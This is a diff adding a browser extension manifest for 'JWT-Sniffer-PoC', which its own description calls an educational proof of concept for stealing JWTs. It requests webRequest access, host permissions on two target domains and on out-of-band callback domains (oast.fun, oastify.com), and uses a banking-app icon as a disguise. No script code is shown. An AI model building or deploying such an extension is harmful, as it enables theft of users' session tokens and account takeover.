@@ -1,0 +1,24 @@
+{
+    "manifest_version": 3,
+    "name": "JWT-Sniffer-PoC",
+    "version": "1.0",
+    "permissions": [
+        "webRequest"
+    ],
+    "description": "Educational PoC demonstrating JWT exfiltration via browser extension.",
+    "icons": {
+        "16": "banking-app.png",
+        "48": "banking-app.png",
+        "128": "banking-app.png"
+    },
+    "host_permissions": [
+        "*://*.target-app.com/*",
+        "*://*.another-target.com/*",
+        
+        "https://*.oast.fun/*",
+        "https://*.oastify.com/*"
+    ],
+    "background": {
+        "service_worker": "background.js"
+    }
+}
